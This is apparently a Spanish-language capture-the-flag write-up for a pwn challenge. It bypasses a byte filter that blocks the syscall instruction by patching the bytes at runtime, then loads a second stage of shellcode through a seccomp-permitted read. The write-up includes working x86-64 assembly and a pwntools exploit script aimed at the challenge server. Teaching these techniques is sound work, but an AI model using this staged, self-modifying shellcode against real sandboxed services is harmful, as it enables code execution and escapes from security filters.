# [Pwn] OWRJail revenge

## Descripción

Tal vez si fue sencillo, una validación lo hará divertido.

`nc 64.23.142.12 1339`

## Archivos proporcionados

- `orwjail_revenge`
- `Dockerfile`

## Análisis

Comencé conectándome al servicio, el cual ahora dice:

```
=== orwjail: revenge ===
Back again? No syscalls in your bytes, no name for the flag.
stage1>
```

Esta versión intenta impedir que enviemos la instrucción `syscall`. Para saber cómo lo validaba, busqué las funciones disponibles en el nuevo binario:

```bash
$ nm -n orwjail_revenge
...
0000000000401537 t has_raw_syscall
00000000004015c9 T main
```

Desensamblé `has_raw_syscall` con:

```bash
objdump -d -M intel orwjail_revenge
```

Siguiendo su lógica vemos que recorre nuestra entrada buscando únicamente estas dos secuencias:

```c
if (buf[i] == 0x0f && buf[i + 1] == 0x05)
    return 1; /* syscall */

if (buf[i] == 0xcd && buf[i + 1] == 0x80)
    return 1; /* int 0x80 */
```

La validación sólo se ejecuta antes de nuestro shellcode. Revisando `main` también vemos que el tercer argumento de `mmap` es 7, es decir, la memoria tiene permisos de lectura, escritura y ejecución. Por lo tanto, podemos enviar bytes que no estén prohibidos y modificarlos durante la ejecución. Entonces podríamos intentar enviar `0f 04`, y aumentar después su segundo byte para convertirlo en `0f 05`:

```asm
lea rbx, [rip+gate]
inc byte ptr [rbx+1]

gate:
    .byte 0x0f, 0x04
```

Para comprobarlo hice un shellcode pequeño que construía el `syscall` así, para hacer un `write(1, "a", 1)`, el cuál sí funcionó.

Sin embargo, tenemos otro obstáculo en `main`. El primer `read` sólo recibe `0x40` bytes. Por eso el prompt dice `stage1`, esos primeros 64 bytes tenían que cargar una segunda etapa.

Después comparé `install_seccomp` con la versión original. La whitelist contenía las mismas funciones, pero ahora también permitía `read` siempre que el descriptor fuera 0. Con esto podemos leer el resto del payload desde stdin. El plan será construir una instrucción syscall en `stage1`, ejecutar `read(0, stage2_address, 0xf00)` y saltar a stage2_address. En stage2 ejecutaremos el mismo código del reto anterior.

Sin embargo, todavía necesitamos una dirección válida donde guardar `stage2`. Podemos obtener una dirección dentro de stage1 usando RIP. Como el `mmap` está alineado a 0x1000, sus últimos 12 bits representan el offset dentro de la página. Al limpiarlos obtenemos la dirección base del mapeo. Después sumamos 0x100 para dejar espacio de sobra para los 64 bytes de stage1:

```
lea rsi, [rip]       /* una dirección dentro de stage1 */
and rsi, -0x1000     /* mask 0xfffffffffffff000: base de la página */
add rsi, 0x100       /* dirección donde cargaremos stage2 */
```

Con esto construí el primer stage (para esto también me ayudé con Codex):

```python
stage1 = asm(r"""
    endbr64
    lea rbx, [rip+gate]
    inc byte ptr [rbx+1]

    lea rsi, [rip]
    and rsi, -0x1000
    add rsi, 0x100

    xor eax, eax
    xor edi, edi
    mov edx, 0xf00
gate:
    .byte 0x0f, 0x04
    jmp rsi
""").ljust(0x40, b"\x90")
```

Primero se modifica `gate` para construir la instrucción `syscall`. Después preparamos `read(0, página + 0x100, 0xf00)`. Al terminar la lectura, el `jmp rsi` empieza a ejecutar la segunda etapa.

Para `stage2` reutilicé el shellcode del primer reto. Aquí si podemos utilizar `syscall` sin problema, ya que `has_raw_syscall` sólo revisa los primeros 64 bytes recibidos por `main`.

## Extracción

Teniendo ambos stages, los podemos implementar en Python (ve `revenge_solve.py`) y enviarlos juntos:

```python
io = remote("64.23.142.12", 1339)
io.recvuntil(b"stage1> ")
io.send(stage1 + stage2)
print(io.recvall().decode(), end="")
```

El primer `read` toma exactamente los 64 bytes de `stage1`. Los demás bytes quedan disponibles para el `read` que construimos dentro del loader, por lo que terminan almacenados en el offset `0x100` y se ejecutan como `stage2`.

Al ejecutarlo, obtenemos como salida la flag.

## Flag

`AHAU{r3v3ng3_still_n0_syscall_still_st4g3d_1n_git_gud_l0l}`
